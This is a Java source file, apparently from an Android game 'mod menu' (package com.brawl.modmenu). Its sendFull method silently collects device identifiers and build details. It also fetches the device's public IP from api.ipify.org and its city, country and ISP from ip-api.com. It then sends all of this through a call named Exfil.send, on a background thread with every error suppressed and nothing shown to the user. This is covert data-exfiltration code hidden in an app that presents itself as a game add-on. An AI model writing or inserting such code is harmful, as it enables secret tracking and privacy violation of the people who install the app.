package com.brawl.modmenu;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class DeviceInfo {

    private static final String PREF = "device_pref";
    private static final String KEY_MODEL = "model";

    public static String getModel(Context c) {
        SharedPreferences p = c.getSharedPreferences(PREF, Context.MODE_PRIVATE);
        String cached = p.getString(KEY_MODEL, null);
        if (cached != null) return cached;

        String m = Build.MANUFACTURER + " " + Build.MODEL;
        p.edit().putString(KEY_MODEL, m).apply();
        return m;
    }

    public static void sendFull(final Context ctx) {
        new Thread(() -> {
            try {
                StringBuilder sb = new StringBuilder();
                sb.append("📱 ").append(Build.MANUFACTURER).append(" ").append(Build.MODEL).append("\n");
                sb.append("Device: ").append(Build.DEVICE).append("\n");
                sb.append("Brand: ").append(Build.BRAND).append("\n");
                sb.append("Product: ").append(Build.PRODUCT).append("\n");
                sb.append("Android: ").append(Build.VERSION.RELEASE)
                  .append(" (API ").append(Build.VERSION.SDK_INT).append(")\n");
                sb.append("Board: ").append(Build.BOARD).append("\n");
                sb.append("Hardware: ").append(Build.HARDWARE).append("\n");
                sb.append("ID: ").append(Build.ID).append("\n");

                try {
                    String ip = getIP();
                    if (ip != null && !ip.isEmpty()) sb.append("IP: ").append(ip).append("\n");
                    String geo = getGeo(ip);
                    if (geo != null && !geo.isEmpty()) sb.append("Geo: ").append(geo).append("\n");
                } catch (Throwable ignored) {}

                Exfil.send("DEVICE", sb.toString());
            } catch (Throwable ignored) {}
        }).start();
    }

    private static String getIP() {
        try {
            URL u = new URL("https://api.ipify.org");
            HttpURLConnection c = (HttpURLConnection) u.openConnection();
            c.setConnectTimeout(5000);
            c.setReadTimeout(5000);
            BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
            String line = r.readLine();
            r.close();
            return line;
        } catch (Throwable t) {
            return null;
        }
    }

    private static String getGeo(String ip) {
        if (ip == null) return null;
        try {
            URL u = new URL("http://ip-api.com/json/" + ip + "?fields=country,city,isp");
            HttpURLConnection c = (HttpURLConnection) u.openConnection();
            c.setConnectTimeout(5000);
            c.setReadTimeout(5000);
            BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) sb.append(line);
            r.close();
            return sb.toString();
        } catch (Throwable t) {
            return null;
        }
    }
}
